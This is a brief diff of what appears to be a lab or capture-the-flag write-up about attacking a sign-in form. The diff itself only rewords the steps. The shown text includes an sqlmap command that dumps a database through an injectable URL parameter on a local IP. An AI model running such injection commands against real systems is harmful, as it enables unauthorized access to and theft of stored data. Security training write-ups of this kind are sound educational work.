@@ -3,8 +3,7 @@
 It's possible for an attacker to brute force the sign in form
 
 ## Steps
-* Open your terminal
-* Run
+* Open your terminal and run:
 ```bash
 sqlmap "http://192.68.0.106/index.php?page=member&id=1&Submit=Submit#" --dump -D Member_Brute_Force
 ```
